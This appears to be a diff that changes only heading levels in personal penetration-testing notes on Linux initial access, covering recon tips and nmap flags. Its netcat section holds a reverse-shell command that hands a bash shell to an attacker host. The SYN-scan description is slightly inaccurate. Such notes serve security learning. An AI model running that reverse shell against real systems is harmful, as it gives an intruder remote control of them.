@@ -1,6 +1,6 @@
 # linux - initial access
 
-### recon
+## recon
 
 Look for:
 
@@ -16,9 +16,9 @@ Common things
 * generous permissions
 * vague variables
 
-### nmap
+## nmap
 
-##### flags
+### flags
 
 * `-sS` - TCP syn port scan
   * we send SYN, server sends ACK or SYN/ACK, that means port is open
@@ -36,13 +36,13 @@ Common things
 * `-oA` - output in all formats
 * `-v` - verbose
 
-##### sample
+### sample
 
 ```bash
 nmap <ip-address>
 ```
 
-### netcat
+## netcat
 
 * `nc <attacker-ip> <port-number> -c /bin/bash`
 
